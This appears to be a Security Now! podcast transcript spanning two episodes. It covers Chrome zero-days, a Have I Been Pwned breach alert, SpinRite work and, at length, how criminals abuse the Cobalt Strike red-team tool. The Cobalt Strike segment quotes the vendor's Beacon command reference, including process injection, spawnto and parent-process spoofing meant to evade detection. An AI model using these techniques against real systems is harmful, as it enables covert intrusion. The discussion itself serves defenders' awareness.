LEO:  The Allies had cracked the Enigma machine.  But if they had used the information coming through Nazi communications to save submarines and vessels sailing across the Atlantic, it would have given away the fact that they'd cracked the code.



STEVE:  Well, and I love the story, right, that they contrived to make the discovery of the U-boat missions accidental.  Like, you know, having some weather craft fly over and, like, spot them.  And then, of course, and thus be able to launch an attack.  So, wow.



LEO:  British spy agencies were quite inventive in that era.  Just fascinating stories from that time.  Anyway, I thought I'd pass that along to you.



STEVE:  Thank you.



LEO:  The Kaseya story.  They eventually did give it to Kaseya.  But it took them three weeks to get it to them.



STEVE:  Wow.



LEO:  All right.  Back to Steve.



STEVE:  Speaking of keeping the bad guys out.  Google patched the ninth and 10th in-the-wild zero-days in Chrome this year.  



LEO:  Oh, my god.



STEVE:  I know.



LEO:  I mean, the browser is the vector for most attacks because it's what goes on the Internet.  I don't think that Chrome is more insecure than anything else.



STEVE:  Nope.  It is the big target.



LEO:  Right.



STEVE:  And as we've said, browsers are just crazy complicated now.  I mean, they're elevating themselves to the complexity of an operating system.  So the good news is everyone running Chrome desktop for Windows, Mac, and Linux will now find themselves running 93.0.4577.82.  So first number 93, last one that matters 82.  And that's good news since the bad guys are scouring Chrome for any way in.  And so far they've been discovering and exploiting those ways all this year at a rate slightly better than one per month, since we're in month nine, and this is zero-days nine and 10.  Chrome's update to 93 blah blah dot 82 fixes a total of 11 security vulnerabilities, two of them being these zero-days exploited in the wild.  One is an out-of-bounds write in the V8 JavaScript engine, and the other is a use-after-free bug in the Indexed DB API.  So they're both memory bugs.  The release notes commented that:  "Google is aware that exploits for CVE-2021-30632 and 30633 exist in the wild."



The two zero-day vulnerabilities were disclosed to Google - get this, Leo - on September 8th.  So Chromium gets fixed in less than a week.  Five days, actually.  This makes me even more glad that Microsoft decided that they were incapable of managing the ongoing development and maintenance of a state-of-the-art web browser.  They adopted the Chromium core, thank goodness.  As we know, our web browsers are today's primary attack surface, as you were just saying.  We push them out onto the Internet and actively solicit unknown remote web servers to download and run their code on our machine.



LEO:  Well, when you put it that way, it's amazing it works at all.



STEVE:  I know.  This is where we all say in chorus:  What could possible go wrong?  It sounds insane.  And it really is.  So Lord knows that we cannot be waiting nine months for Microsoft to get around to fixing critical problems that they've been informed of.  Google takes five days.  Thank you.  Happy to be behind a Chromium-based browser.



LEO:  Well.  And that's the other thing.  Everybody else benefits, too, because of all the Chromium-based browsers.



STEVE:  Yeah.



LEO:  It is the one good argument for having everybody run Chromium.  Including Edge.



STEVE:  Because you get to multiply - exactly, yeah, yeah.  Okay.  So was GRC pwned, Leo?



LEO:  What?



STEVE:  The last time we talked about Troy Hunt's excellent Have I Been Pwned web service, I noted that not only is it possible for individuals to subscribe to the site's autonomous notifications via email in the event of that email address appearing in any new breach, which Have I Been Pwned adds to their massive and growing breach database, but anyone who owns their own email domain, like TWiT.tv, can similarly submit their entire domain for notification.  And I did that quite a while ago.



So I was interested to receive a notification on Sunday, day before yesterday, from HIBP (Have I Been Pwned), informing me that one or more email accounts belonging to GRC.com had just popped up in a new data breach.  And sure enough, while gathering the cyber news of the past week to share with everyone here, I encountered the mention of that site which had been mentioned by Have I Been Pwned as having been breached.  The site was Epik, E-P-I-K, dot com, which I had no memory of ever giving any email credentials to.  I didn't know of it at all.  And Wikipedia, however, knows about them, saying:  "Epik is an American domain registrar and web hosting company known for providing services to websites that host far-right, neo-Nazi, and other extremist content."  Uh, what?  And a breach of that site had leaked some GRC credentials?



So the security industry coverage of this breach notes that Epik is the host of sites including Gab, Parler, and "The Donald."  And the reputable site The Record, which was tipped off of the breach on Monday, first received a small subset of samples which was later followed by a full copy of the entire leak from an individual who claimed to be loosely associated with the Anonymous group  the group which was proudly claiming responsibility for the breach and this extensive exfiltration.  When The Record then reached out for comment last Tuesday, Epik denied the breach and the hackers' claims in an email reply.  Epik wrote:  "We are not aware of any breach.  We take the security of our clients' data extremely seriously, and we are investigating the allegation."  Signed, Epik spokesperson.



Okay.  So despite Epik's denial, the data which The Record received in full and reviewed confirms the hacker's - the Anonymous group hacker's - claims.  In a 32GB torrent file hosted through the DDoSecrets portal, the hackers included several SQL database dumps containing gigabytes of sensitive information such as domain ownership details, domain transactions, account details, and troves of personal data points.



Okay.  So presumably a subset of this massive trove of information was then provided to Troy and was added to his Have I Been Pwned database, whereupon any of those who had previously signed up for notification would receive an email, just as I had.  But I still had no idea how GRC could possibly have been part of the breach of such a domain registrar and host provider.



LEO:  Especially since it didn't happen.



STEVE:  Well, exactly.  Very good point.  What are you talking about?



LEO:  There was no breach.



STEVE:  We didn't notice any breach.  Did you see it, Margaret?  No.  Okay.  So I went over to HIBP to see what was up.  It's possible to query Troy's terrific site for any matches on a specific email address or, if one owns an entire domain, any matches against that domain.  So I did that, and I found the two email addresses that had apparently been, and now I have air quotes, "leaked" by the breach of Epik.com.  They were network-solutions-public-whois@grc.com, and whois2011-1@grc.com.  Whew.  So it was neither I nor Sue nor Greg nor any corporate email.  Returning to the emailed notification I had received from Have I Been Pwned, I discovered that the notification that Troy's site sent had provided an interesting description of the breached site, along with the notification.



Have I Been Pwned said:  "In September 2021," that is, this - "the domain registrar and web host Epik suffered a significant data breach, allegedly in retaliation for hosting alt-right websites.  The breach exposed a huge volume of data, not just of Epik customers, but also scraped WHOIS records belonging to individuals and organizations who were not Epik customers.  The data included over 15 million unique email addresses, including anonymized versions for domain privacy, names, phone numbers, physical addresses, purchases, and passwords stored in various formats."  So, big whew.  That all fits.



LEO:  Was Epik scraping WHOIS?



STEVE:  Yes.  Probably to spam for commercial purposes.  Those two GRC.com email addresses would have indeed been scraped from some of GRC's public ICANN domain registrations.  And who knows why this distasteful-seeming domain registrar might have had them?  As I wrote in the show notes, perhaps to use as spamming for commercial purposes, "come on over here" registration solicitations.  Because the date of registration shows, so they would know to send email addresses when your registration is close to being renewed.



LEO:  Right, or to snipe your domain, maybe.



STEVE:  Could also be.  Good point.



LEO:  Who knows what their business was, yeah.



STEVE:  If it doesn't get renewed, then grab it, yup.  Anyway, in any event, I thought it was very cool that Have I Been Pwned's proactive service works.  It's the first time it's notified me since this was - you know, it had never occurred to me.  And I wanted to make sure to take this opportunity to remind our listeners of Troy's useful and 100% free service.  So thank you, Troy.  And, whew, fortunately that was just a weird misfire.



LEO:  Yeah.



STEVE:  Wow.  I wanted to remind our listeners that the first three installments of Apple's 10-part miniseries based on Isaac Asimov's Foundation trilogy become available this Friday the 24th.  As it happens, Lorrie and I had some dinner party plans which were moved from Friday to Thursday.



LEO:  Whew.



STEVE:  Yes, which worked for me since I'd love to be able to set this Friday night aside for those first three Foundation episodes.  I don't know if they're an hour each.  Are they two hours each?  I don't know how long each one is.  But I can't wait.  It looks wonderful.



And just another note, we will be needing to wait one more month for the remake of "Dune," which will be appearing on HBO Max, as well as for Apple TV's release of another 10-part miniseries, "Invasion," which chronicles an invasion of Earth by hostile extraterrestrials.  So it's looking like the sci-fi lovers among us will finally be having some fun and some new visuals.  I think that's mostly what I love about these films, Leo, is that they're just, you know, I mean, the plot lines are rarely surprising; right?



LEO:  Well, you read the book; right?  You know.



STEVE:  Oh, yeah, yeah, yeah.  I know all about...



LEO:  Yeah, you know what's going to happen, yeah.



STEVE:  ...what's happening, yeah.



LEO:  I can't wait.  I'm going to - Friday.  That's exciting.



STEVE:  Also a note that my work on SpinRite is progressing.  As I last noted, I was becoming uncomfortable with having written so much completely untested code.  It's all since been tested.  I decided to stop writing, to exercise and debug everything I've written.  That's done.  SpinRite has always incorporated drive benchmarks.  They in fact, for a reason we'll see in a minute, I was just reminded that even SpinRite 1 apparently did that.  The benchmarks perform deliberately repetitive and non-repetitive reads to measure various aspects of a drive's physical data read and cached data performance.



The benchmarks also have the benefit of giving SpinRite's new - the current benchmarks that exist in SpinRite, what will be 6.1, giving SpinRite's new IO abstraction system a rather thorough workout, which is precisely what it needs.  So I have updated the benchmarking code to work with the new system.  I was going to have to do that anyway, decided to do it now.  And I'm nearly ready to make another test release available to the SpinRite testing gang.



Once the dust has settled from that, I'll finish updating the data recovery code, which was where I was when I decided to pause and make sure everything I'd written was already working.  Then I'm pretty sure that the logging system will need adjusting.  I've already been in that code updating things for everything that changed about 6.1, but nothing was running back then, so I wasn't able to confirm that the various new formatting things I had written were working.



And while I'm sure that other stuff will come up, it really does feel as though we're sort of getting to the point where we can see the light at the end of this very long tunnel.  As I had mentioned before, I've pretty much rewritten SpinRite.  I underestimated the amount of work that would be necessary.  But I'm glad I did because this is the new foundation for everything going forward.



And in the meantime, I have something very fun to share.  A guy by the name of Adrian Black has a retro computing YouTube channel called "Adrian's Digital Basement," to which a bunch of our listeners subscribe.  I know that because I began receiving tweets informing me of Adrian's recent posting.  A couple of Saturdays ago, Adrian was playing with a sort of amazing emulator for the very first MFM (Modified Frequency Modulation) hard drives of the sort that the first IBM XT could be equipped with.  So this is an emulator which pretends to be an MFM drive.  It acts exactly like an MFM drive.  You know, 17 sectors per track and all that, that we had back then.  And, you know, it's sort of in the way that like the machines that you see blinking behind me have a chip that emulates a PDP-8, and we've got PDP-11s, Leo, where there's actually a little Linux machine behind them doing, you know, reading the switches and blinking the lights, again as an emulator.  So this thing pretends to be a hard drive.



So anyone who recalls the iconic golden-shelled 10MB Seagate ST-225 will see one sitting there on Adrian's workspace.  You can see it there in the middle over on the right.



LEO:  The question is why would you want to emulate this?



STEVE:  Uh-huh.  Well, on the screen there to the left...



LEO:  Because you can.  Yeah?



STEVE:  On the screen there to the left...



LEO:  Oh, yeah, I recognize that screen.



STEVE:  ...is an ancient version of SpinRite.  This MFM hard drive emulator was not transferring data very quickly, and Adrian suspects that perhaps that's because the emulator was low-level formatted with a one-to-one sector interleave.  Remember, it's a drive.  It's pretending to be an MFM hard drive.  And Leo, I do agree with you, like, okay, how much time did the person who created this thing have on their hands?  Okay.  So if the interleave is one-to-one, and that's too tight, that means there's no sector interleaving at all.  But the controller he has the emulator hooked up to is not fast enough to run it one to one.  It needs some interleaving.  It's not quick enough to catch the immediate next sector after reading the previous one.



Okay.  So without batting an eye in this video, which is this week's grc.sc shortcut, thus grc.sc/837, Adrian fires up an ancient copy of SpinRite and has SpinRite examine the current speed and interleave, then has SpinRite optimize the drive's interleave, just like in the old days.



LEO:  Oh, I remember you could do that.  That's right.



STEVE:  Yes, and you see it actually doing it.  It successively tries each interleave in turn and measures the drive's data transfer performance...



LEO:  I remember that.



STEVE:  ...at each interleave setting.



LEO:  Holy cow.



STEVE:  And then builds a correspondence table.  So this week's GRC shortcut, as I noted, it will jump you 41 minutes in, to just before Adrian begins to run his ancient copy of SpinRite on the emulator.  Again, https://grc.sc/837.  Anyway, I know that some of our listeners will get a kick out of it.



LEO:  Could he do that with SpinRite 6?  Or is that too ancient a technology?



STEVE:  No, I took out all the interleaving code.  I think 3.1 still had it.  I don't remember whether 5 did.  There have been requests that we've had from people who have like an 8088 or an 8086 because my newer code started using some of the instructions from the 286 or the 386, just because they're just so good.  I had to use a couple, like, well, for example, RDTSC is Read the Time Stamp, which provides high-resolution timing information.  There was some that was okay back on the 8088 and 86, which is all I was, you know, all I could use is what I had back then.  But the point is that we can provide a SpinRite 3.1, a working SpinRite 3.1, for people who have a need.  That will perform interleaving.  And, frankly, I don't recognize, it's been so long, I don't recognize the screen, like which version of SpinRite it is from looking at the screen.  So I'm sure someone will tell us.



LEO:  The good old days.



STEVE:  Ah, yes.



LEO:  I realize the reason you might want an MFM drive is if you were trying to emulate something that thought it was going to be running on an MFM drive.



STEVE:  Yes, actually.  And he makes reference to that.  I think he has an actual PDP-8.



LEO:  There you go.



STEVE:  That had a hard drive controller, and they're just, you know, all of them...



LEO:  So he wants to use a modern drive, but he has to emulate - or modern storage of some kind.  But he has to emulate it, yeah.



STEVE:  Yes.



LEO:  Yeah, that makes sense.



STEVE:  Yes.



LEO:  So there is a good reason to do that.  I mean, here you are, sitting in front of a bunch of PDPs.  I'm sitting in front, I mean, obviously we don't have any affection for the old kind of computing, not at all.



STEVE:  That's right.



LEO:  Of course they're all running Arduinos and Raspberry Pis.



STEVE:  Right.



LEO:  But it's a lot easier.  I don't think I can run an MFM drive on this Altair 8800.  I think I'd have to run a - I don't know what I'd - a paper tape reader.  I don't know.  Okay, Steve.  Let's get to the meat of the matter today.



STEVE:  Okay.  So we're going to learn about, sadly, a new tool which has fallen into the bad guys' hands.  CobaltStrike.com proudly introduces newcomers to their quite pricey offering with the headline "Software for Adversary Simulations and Red Team Operations."  So they go on to explain.  This is a product that they are offering.  "Adversary Simulations and Red Team Operations are security assessments that replicate the tactics and techniques of an advanced adversary in a network.  While penetration tests focus on unpatched vulnerabilities and misconfigurations, these assessments benefit security operations and incident response.



"Cobalt Strike gives you a post-exploitation agent and covert channels to emulate a quiet long-term embedded actor in your customer's network.  Malleable command-and-control lets you change your network indicators to look like different malware each time.  These tools complement Cobalt Strike's solid social engineering process, its robust collaboration capability, and unique reports designed to aid blue team training.



"Raphael Mudge created Cobalt Strike in 2012 to enable threat-representative security tests.  Cobalt Strike was one of the first public red team command and control frameworks.  In 2020, HelpSystems acquired Cobalt Strike to add to its Core Security portfolio.  Today, Cobalt Strike is the go-to red team platform for many U.S. government, large business, and consulting organizations."  In other words, this is a top-level, state-of-the-art, high-end tool used, well, intended to be used by good guys to perform benign post-penetration red team operations.  The bad news is it's so good that it has also rapidly become the go-to platform for non-simulated real world malware post-penetration network infiltration.



We've seen many examples over the years of well-designed and well-meaning utilities being commandeered and abused for malicious purposes.  For example, Sysinternals' Mark Russinovich created PsExec.  Its description at Microsoft, who as we know purchased Sysinternals back in the summer of 2006, the PsExec description says - and read this as something from the malicious perps' viewpoint.  They said:  "Utilities like Telnet, and remote control programs like Symantec's PC Anywhere, let you execute programs on remote systems; but they can be a pain to set up, and require that you install client software on the remote systems that you wish to access."  Oh, how pesky.  "PsExec is a lightweight Telnet replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software."



LEO:  Don't you hate that?



STEVE:  What could possibly go wrong?  Isn't this wonderful?  How convenient.  Unfortunately for everyone.  They say:  "PsExec's most powerful uses [uh-huh] include launching interactive command-prompts on remote systems and remote-enabling tools like IPConfig that otherwise do not have the ability to show information about remote systems."



LEO:  Oh, man.



STEVE:  I know.  At this point once again we say in unison, what could possibly go wrong?



LEO:  What could possibly go wrong?



STEVE:  Oh, and it even said, it had a little footer:  "Note:  some anti-virus scanners report that one or more of the tools are infected with a 'remote admin' virus.  None of the PsTools contain viruses, but they have been used by viruses, which is why they trigger virus notifications."  Yeah.  And of course another example real quick, I chose the lovely Remote Utilities solution for my own and for Lorrie's remote system control needs for the same reasons that it has also become the remote control solution of choice for nameless miscreants across the Internet.  It's not its fault, of course.  Just like a compiler compiles code, it can't help it if the code it's compiling is malware.



Okay.  So today, Cobalt Strike deserves and receives our attention because it appears that we're just at the beginning of a wave of malicious exploitation which unfortunately is all being enabled by Cobalt Strike.  Back in July, the security firm Proofpoint published, and then recently updated, a report titled:  "Cobalt Strike:  Favorite Tool from APT to Crimeware."  Of course APT, Advanced Persistent Threat.



One of the terms we'll encounter today and in the future is "Beacon," or "Cobalt Strike Beacon."  The Beacon is the bad bit that's infiltrated into an unwitting victim's machine.  And unfortunately it was quite well designed.  Okay.  Listen to how Cobalt Strike themselves boast about Beacon's capabilities.  They write:  "Beacon is Cobalt Strike's payload to model advanced attackers.  Use Beacon to egress a network over HTTP, HTTPS, or DNS."  By the way, also SMB.



"You may also limit which hosts egress a network by controlling peer-to-peer Beacons over Windows-named pipes.  Beacon is flexible and supports asynchronous and interactive communication.  Asynchronous communication is low and slow.  Beacon will phone home, download its tasks, and go to sleep.  Interactive communication happens in real-time.  Beacon's network indicators are malleable.  Redefine Beacon's communication with Cobalt Strike's malleable C2 (command-and-control) language.  This allows you to cloak Beacon activity to look like other malware, or blend in as legitimate traffic."



And then they go into some additional detail which should chill the blood of any CISO.  They say:  "Right-click on a Beacon session and select 'interact' to open that Beacon's console.  The console is the main user interface for your Beacon session.  The Beacon console allows you to see which tasks are issued to a Beacon and see when it downloads them.  The Beacon console is also where command output and other information will appear."  So, right, a complete happy point-and-click user interface for the bad guys to manage all the Beacons that they have managed to install in their victims' machines.



"Be aware that Beacon is an asynchronous payload.  Commands do not execute right away.  Each command goes into a queue.  When the Beacon checks in, that is, connects to you, it will download these commands and execute them one by one.  At this time, Beacon will also report any output it has for you.  If you make a mistake, use the clear command to clear the command queue for the current Beacon.



"By default, Beacons check in every 60 seconds.  You may change this with Beacon's sleep command.  Use sleep followed by a time in seconds to specify how often Beacon should check in.  You may also specify a second number between 0 and 99.  This number is a jitter factor."  Right?  Because to introduce random check-in timings in order to further hide the Beacon.  "Beacon will vary each of its check-in times by the random percentage you specify as a jitter factor."  Ah, so it's a percentage.  "For example, sleep 300 20 will force Beacon to sleep for 300 seconds with a 20% jitter percentage.  This means Beacon will sleep for a random value between 240 to 300 seconds after each check-in."  Ah, so it's unidirectional from the time you specify.



"To make a Beacon check in multiple times each second, try sleep 0.  This is interactive mode.  In this mode, commands will execute right away.  You must make your Beacon interactive before you tunnel traffic through it."  So it's also a tunneling technology.  That's what they meant when they said it will export a network.  It will literally export a network connection.  "A few Beacon commands - browser pivot, desktop, et cetera - will automatically put Beacon into interactive mode at the next check in."



So running commands:  Beacon's shell command will task a Beacon to execute a command via cmd.exe on the compromised host.  When the command completes, Beacon will present the output to you.  Use the run command to execute a command without cmd.exe.  The run command will post output back to you.  The execute command runs a program in the background and does not capture output.  Use the powershell command to execute a command with PowerShell on the compromised host.  Use the powerpick command to execute PowerShell cmdlets without powershell.exe.  This command relies on the Unmanaged PowerShell technique developed by Lee Christensen.  The powershell and powerpick commands will use your current security token.  The psinject command will inject Unmanaged PowerShell into a specific process and run your cmdlet from that process.



The powershell-import command will import a PowerShell script into Beacon.  Future uses of the powershell, powerpick, and psinject commands will have cmdlets from the imported script available to them.  Beacon will only hold one PowerShell script at a time.  Import an empty file to clear the imported script from Beacon.



The execute-assembly command will run a local .NET executable as a Beacon post-exploitation job.  You may pass arguments to this assembly as if it were run from a Windows command-line interface.  This command will also inherit your current token.  If you want Beacon to execute commands from a specific directory, use the cd command in the Beacon console to switch the working directory of a Beacon's process.  The pwd command will tell you which directory you're currently working from.



Last, but not least, Beacon can execute Beacon Object Files without creating a new process.  Because won't that be handy.  Beacon Object Files are compiled C programs, written to a specific convention, that run within a Beacon session.  Use inline-execute followed by args to execute a Beacon Object File with the specified arguments.  Use the spawn command to spawn a session for a listener.  The spawn command accepts an architecture, for example x86 or x64, and a listener as arguments.  By default, the spawn command will spawn a session in rundll32.exe.  An alert administrator may find it strange that rundll32.exe is periodically making connections to the Internet.  Find a better program, for example Internet Explorer, 



and use the spawnto command to state which program Beacon should spawn sessions to.



The spawnto command requires you to specify an architecture (x86, x64) and a full path to a program to spawn, as needed.  Type spawnto by itself and press enter to instruct Beacon to go back to its default behavior.  Type inject followed by a process id and a listener name to inject a session into a specific process.  Use ps to get a list of processes on the current system.  Use inject [pid] x64 to inject a 64-bit Beacon into an x64 process.  The spawn and inject commands both inject a payload stage into memory.  If the payload stage is an HTTP, HTTPS, or DNS Beacon, and it can't reach you, you will not see a session.  If the payload stage is a bind TCP or SMB Beacon, these commands will automatically try to link to and assume control of these payloads.



Use dllinject [pid] to inject a Reflective DLL into a specific process, by process ID.  Use the shinject [pid] architecture and path command to inject shellcode from a local file into a process on the target.  Use shspawn architecture and path to spawn the "spawn to" process and inject the specified shellcode file into the process.  Use dllload process ID and path to load an on-disk DLL into another process of your choice.  Use ppid and then pid to assign an alternate parent process for programs run by your Beacon session.  This is a means to make your activity blend in with normal actions on the target.  I mean, these guys could not have written a more potent horrifying tool for bad guys to have gotten a hold of.  And I won't keep, I mean, it goes - there's the runu, the spawnu, and others.



This is a dream come true for the underworld.  It was deliberately and consciously designed by advanced cybersecurity experts specifically to operate as covertly as possible using every advanced trick in the book.  And it's now loose, being proactively used, not for red versus blue team training, but in the wild by threat actors.  And its use is spreading, not just in depth, but dramatically in breadth.



Here's what Proofpoint describes and found.  They said:  "In December 2020 the world learned about an expansive and effective espionage campaign that successfully backdoored the popular network monitoring software" - wait for it - "SolarWinds.  Investigators revealed tools used by the threat actors including Cobalt Strike Beacon."  In other words, Cobalt Strike Beacon, the malicious use of it, was behind the now-infamous Solar Winds attacks.



"This campaign," they wrote, "was attributed to threat actors working for Russia's Foreign Intelligence Service, a group with Cobalt Strike in their toolbox since at least 2018.  This high-profile activity was part of a clever attack chain enabling advanced threat actors to surreptitiously compromise a relatively small number of victims.  The tool used and customized to fit their needs is almost" - meaning Cobalt Strike Beacon - "is almost a decade old, but increasingly popular."



Cobalt Strike debuted in 2012 in response to perceived gaps in an existing red team tool, the Metasploit Framework.  In 2015, Cobalt Strike 3.0 launched as a standalone adversary emulation platform.  By 2016, Proofpoint researchers began observing threat actors using Cobalt Strike.  Historically, Cobalt Strike used in malicious operations was largely associated with well-resourced threat actors, including large cybercrime operators like TA3546, also known as FIN7, and APT groups such as TA423, also known as Leviathan or APT40.



Proofpoint researchers have attributed two-thirds of identified Cobalt Strike campaigns from 2016 through 2018 to well-resourced cybercrime organizations or APT groups.  That ratio decreased dramatically the following years.  Between 2019 and present, just 15%, down from 66, 15% of Cobalt Strike campaigns were attributable to known threat actors.  In other words, the word got out that Cobalt Strike was the tool to use.  And after running through that command reference, of course.  And everyone began picking it up and using it.



Proofpoint notes that:  "Threat actors can obtain Cobalt Strike in a variety of ways:  purchasing it directly from the vendor's website, which requires verification; buying a version on the dark web via various hacking forums; or using cracked, illegitimate versions of the software.  In March 2020, a cracked version of Cobalt Strike 4.0 was released and made available to threat actors."



And in making even more clear the appeal that Cobalt Strike offers, Proofpoint explains:  "Cobalt Strike is used by a diverse array of threat actors.  And while it is not unusual for cybercriminal and APT actors to leverage similar tooling in their campaigns, Cobalt Strike is unique in that its built-in capabilities enable it to be quickly deployed and operationalized, regardless of actor sophistication or access to human or financial resources."  In other words, you don't need to be a genius to use it.  You don't need a team, and you don't need any money.



"Cobalt Strike is also session-based, that is, if threat actors can access a host and complete an operation without needing to establish ongoing presence, there will not be remaining artifacts on the host after it is no longer running in memory."  And remember that's what we saw with the earlier SolarWinds hacks; right?  It was very hard to get attribution because these things were very careful to erase their footprints.  Cobalt Strike, you know, it was designed to do that.  So in essence, they said, they can hit it and forget it.



"Threat actors," they continue, "can also use the malleability of Cobalt Strike to create customized builds that add or remove features to achieve objectives or evade detection.  For example, APT29 frequently uses custom Cobalt Strike Beacon loaders to blend in with legitimate traffic or evade analysis.  For defenders, customized Cobalt Strike modules often require unique signatures, so threat detection engineers may be required to play catch-up with Cobalt Strike use in the wild.



"Cobalt Strike is also appealing to threat actors for its inherent obfuscation.  Attribution gets more difficult if everyone is using the same tool.  If an organization has a red team actively making use of it, it's possible malicious traffic could be mistaken as legitimate.  The software's ease of use can improve the capabilities of less sophisticated actors.  For sophisticated actors, why spend development cycles on something new when you already have a great tool for the job?  Proofpoint data shows Cobalt Strike is a popular tool for everything from strategic compromises to noisy, widespread campaigns."



So we have a top-of-the-line tool which was designed to enable good guys to stealthily penetrate and inhabit their own networks for the purpose of testing and training anti-penetration and intrusion detection teams.  It licenses for $3,500 per seat.  On the other hand, it got loose, was cracked, is now on the dark web for free, and it's out of control from its publisher.  Now this highly professional high-end tool which no script...



LEO:  Script kitty, meow.



STEVE:  ...which no script kiddie - thank you, Leo - would have ever been able to create for themselves is freely available, being used in the wild on a much more than daily basis.  There is little doubt that we'll be encountering the term "Cobalt Strike" in the future.  Now at least we'll all know exactly what it means and entails when we talk about it.  Wow.



LEO:  David Redekop in our Discourse, our Club TWiT Discourse, says... 



STEVE:  Oh, cool.  Hi, David.



LEO:  Yay.  Hey, David.  He says you can easily block Cobalt Strike C2 connections because CSC2 hosts never use domain names, only hard-coded IP addresses, which is I think what you'd expect with a pen test tool.  You're not going to do DNS on it.  You're going to have the IP address, so you just disallow traffic that wasn't first resolved by DNS. 



STEVE:  Yeah, but that's tricky.  That's going to require a special...



LEO:  Yeah, I don't know how to do that.



STEVE:  ...filter, yeah. 



LEO:  Yeah.



STEVE:  David has a lot of experience with running local small DNS servers.  And I would imagine, if he's saying that, he has a filter that's smart enough to do that as part of his offering.



LEO:  Yeah, yeah.  He says Pegasus did that, as well.  It's nice to have smart people in our chat.  You want to get a copy of this show, I'll tell you how you can do that, a couple of ways.  You can go to Steve's site first.  That's GRC.com.  He has 16Kb audio for the bandwidth-impaired, 64Kb audio for those with ears.  He also has transcripts for those with eyes, nicely written.  You can use them to read along while you're listening, to read standalone, or to use for search.  In fact, that's one of the best benefits of the transcripts.  It allows searching for a specific part of any show, all 837, and going right to that part of the show.  Thanks for doing that, Steve, we appreciate it, and Elaine Farris, who does those transcriptions.



Steve also has a copy waiting for you of something called SpinRite.  Perhaps you've heard of it.  Version 6 is current, the world's best mass storage maintenance and recovery utility.  You can also, if you get 6.0 now, get a free upgrade to 6.1 and kind of follow along with the developments.



STEVE:  It was really cool listening to Adrian on that YouTube video.  He just - he so matter-of-factly talked about it.



LEO:  He was going to run SpinRite.



STEVE:  He was like, "And then I inhaled."  And he said, you know, "And then I ran SpinRite."  It's like, wow, it was just - it was like, so cool.



LEO:  It's actually amazing, I guess it's because he works with this vintage equipment, that he remembered that, oh, yeah, I can fix the interleave.  Just run SpinRite.  It'll pick a better interleave level.  So cool, yeah.



You can also catch the show on our website, that is,  TWiT.tv/sn for Security Now!.  There's a full-time YouTube channel with all the episodes.  And you can also watch it live.  I think a lot of people like to watch it happen live.  You're more than welcome to.  We have live audio and video streams at TWiT.tv/live.  If you are watching live, get in the Discord with our Club TWiT members or our free IRC channel, irc.twit.tv.  You can watch and chat at the same time.  After the fact, the website, YouTube, you might have conversations with other TWiT members in our forums, that's TWiT.community, or our Mastodon instance, TWiT.social.  There are lots of places you can interact with the family of TWiTs.  Of course, Steve has his own forums at GRC.com.



We do the show of a Tuesday afternoon, right after MacBreak  Weekly, usually somewhere between 1:30 and 2:00 p.m. Pacific.  That's 4:30 Eastern; that's 20:30 UTC.  And although I guess are some countries off summertime already?  I think they might be.  But we're still on summertime until after Halloween, till October.  Yabba Dabba Do.  Somebody listening says I need a copy of SpinRite right now.



STEVE:  Thank you.



LEO:  It's awesome.  Thank you, Steve.  Have a wonderful week.  Enjoy "Foundation."



STEVE:  Oh, we'll be talking about it next Tuesday.



LEO:  Oh, that means I have to watch, too.  You're going to watch all three episodes.  All right.  I will, too.  All right.  Thanks, Steve.



STEVE:  Okay, buddy.  Bye.	



Copyright (c) 2021 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.






GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#838

DATE:		September 28, 2021

TITLE:		Autodiscover.fiasco 

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-838.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we examine a new pair of zero-days which have forced emergency updates to their respective products.  We examine the growing annoyance of those who are reporting bugs to Apple, Epik's belated confirmation of their mega data breach, Windows 11's further progress toward its release, and its new and much more useful PC Health Check tool.  We look at some additional fallout from this month's ever-exciting Patch Tuesday, and take notice of a clever new approach for bypassing antimalware checking under Windows.  And after a quick check-in about the first two episodes of Apple TV's "Foundation" series, we settle in to examine the week's most explosive, worrisome, and somewhat controversial disclosure of yet another huge Microsoft screw-up which caused this week's episode to be given the domain name "Autodiscover.fiasco."



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  Great show for you.  We have the 12th, yes, 12th zero-day in Chrome this year alone; a Windows 10 emergency update; Steve's review of "Foundation"; and then we'll find out who owns Autodiscover.wtf and why.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 838, recorded Tuesday, September 28th, 2021:  Autodiscover.fiasco.



It's time for Security Now!, the show where we cover your security online with this guy right here, Steve Gibson.  A good day, sir.



STEVE GIBSON:  Good day to you.  This is...



LEO:  You were waiting for me to say something else, like, "I said, good day, sir."



STEVE:  I don't know what I'm doing.



LEO:  Good day, sir.



STEVE:  This is Episode 838, the last episode of September.  We bid September adieu.



LEO:  Bye-bye.



STEVE:  This is the first podcast ever to be named or to be given a domain name, which you and I before we began recording were lamenting the fact that .fiasco is not actually a valid TLD because...



LEO:  Oh, it'd be so good.



STEVE:  ...couldn't we have some fun with that.  I titled this "Autodiscover.fiasco" for reasons that will become painfully clear to everyone as they have become clear to Microsoft in the past week.  Bu we'll get to there in a minute.  I forgot to query about the Picture of the Week, Leo.  I figured you'd be picking yourself up off the floor, thinking that it was particularly clever.  We will do that in a minute.



LEO:  I don't want to give anything away, but it's very good, yes.



STEVE:  We're going to examine a new pair of zero-days which have forced emergency updates to their respective products.  And I need to scold the industry yet again about the overuse of the term "zero-day."  That just is - everyone's in love with it.  But it's like, no, things that are vulnerabilities are not  automatically...



LEO:  Are not zero-days.



STEVE:  Yes, exactly.  And it's like, oh, no, here comes a zero-day.  It's like, okay, no.  Anyway, we're also going to examine the growing annoyance of those who are reporting bugs to Apple.  I didn't talk about it last week, but it just - there's another instance of it this week, and I thought, okay, we just have to touch on this.  I picked up something on MacBreak Weekly about - that sounded like you guys were mentioning that.



We also have Epik - remember Epik.com - their belated confirmation of what everybody else knew, their mega data breach, which is remember the thing that caused Have I Been Pwned to alert me.  We've also got Windows 11's further progress towards its release and a new and much more useful PC Health Check Tool from Microsoft, which actually is this week's shortcut of the week for the podcast, if anyone wants to jump ahead and put in - oh, no, wait.  I didn't give it the number.  I gave it "slash check" so that it would have a longer life, grc.sc/check.  Anyway, we'll get to there.



